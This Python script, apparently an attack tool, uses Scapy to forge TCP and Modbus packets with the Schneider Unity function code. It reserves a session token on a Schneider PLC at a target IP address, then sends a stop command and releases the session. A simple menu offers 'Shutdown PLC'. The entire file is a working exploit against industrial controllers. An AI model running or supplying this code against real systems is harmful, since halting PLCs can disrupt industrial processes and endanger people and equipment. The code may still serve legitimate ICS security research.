#!/usr/bin/python
import argparse
from scapy.all import *
import binascii


def create_modbus_payload(token, unity_payload):
    mb_trans_id = b'\xca\xfe'
    mb_proto_id = b'\x00\x00'
    mb_unit_id = b'\x00'
    mb_func_code = b'\x5a'  # Schneider Unity Function Code
    mb_length = len(mb_unit_id) + len(mb_func_code) + len(token) + len(unity_payload)

    mb_payload = mb_trans_id + mb_proto_id + mb_length.to_bytes(2, 'big') + mb_unit_id + mb_func_code + token + unity_payload

    return mb_payload



def shutdown(src_ip, dst_ip):
    seq_num = 0
    src_port = random.randint(49100,49199)
    ip_header = IP(src=src_ip, dst=dst_ip)
    tcp_syn_header = TCP(sport=src_port, dport=502, flags="S", seq=seq_num)
    syn_ack_pack = sr1(ip_header/tcp_syn_header, verbose=False)

    ack_num = syn_ack_pack.seq + 1
    seq_num = tcp_syn_header.seq + 1
    tcp_ack_header = TCP(sport=src_port, dport=502, flags="A", seq=seq_num, ack=ack_num)
    ack_resp_pack = send(ip_header/tcp_ack_header, verbose=False)


    # PLC reservation message
    tcp_header = TCP(sport=src_port, dport=502, flags="PA", seq=seq_num, ack=ack_num)
    modbus_payload = create_modbus_payload(b'', b'\x00\x10')
    modbus_header=Raw(load=modbus_payload)
    

    modbus_resp_pack = sr1(ip_header/tcp_header/modbus_header, verbose=False)
    raw_modbus_resp_pack = raw(modbus_resp_pack)
    token = raw_modbus_resp_pack[-1:]
    #ifdef DEBUG
    #print("Session token: ", end='')
    #PRINT(binascii.b2a_hex(token))
    #

    seq_num = seq_num + len(modbus_payload)
    ack_num = ack_num + 11
    tcp_ack_header = TCP(sport=src_port, dport=502, flags="A", seq=seq_num, ack=ack_num)
    ack_resp_pack = send(ip_header/tcp_ack_header, verbose=False)

    # PLC shutdown message
    tcp_header = TCP(sport=src_port, dport=502, flags="PA", seq=seq_num, ack=ack_num)
    modbus_payload = create_modbus_payload(token, b'\x41\xff\x00')
    modbus_header = Raw(load=modbus_payload)
    modbus_resp_pack = sr1(ip_header/tcp_header/modbus_header, verbose=False)

    seq_num = seq_num + len(modbus_payload)
    ack_num = ack_num + 10
    tcp_ack_header = TCP(sport=src_port, dport=502, flags="A", seq=seq_num, ack=ack_num)
    ack_resp_pack = send(ip_header/tcp_ack_header, verbose=False)

    # PLC release message
    tcp_header = TCP(sport=src_port, dport=502, flags="PA", seq=seq_num, ack=ack_num)
    modbus_payload = create_modbus_payload(token, b'\x11')
    modbus_header = Raw(load=modbus_payload)
    modbus_resp_pack = sr1(ip_header/tcp_header/modbus_header, verbose=False)

    seq_num = seq_num + len(modbus_payload)
    ack_num = ack_num + 20
    tcp_ack_header = TCP(sport=src_port, dport=502, flags="A", seq=seq_num, ack=ack_num)
    ack_resp_pack = send(ip_header/tcp_ack_header, verbose=False)



def show_main_menu(src_ip, dst_ip):
    while True:
        print("\t1) Shutdown PLC")
        print("\t9) Exit")
        option = input("\tOption: ")
        if (option == "1"):
            shutdown(src_ip, dst_ip)
        elif (option == "9"):
            break
        else:
            print("Invalid option")
        


if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-s", "--source", required=True, help="Source IP address")
    arg_parser.add_argument("-d", "--destination", required=True, help="Destination IP address (Schenider PLC)")
    args = arg_parser.parse_args()
    src_ip = args.source
    dst_ip = args.destination
    show_main_menu(src_ip, dst_ip)
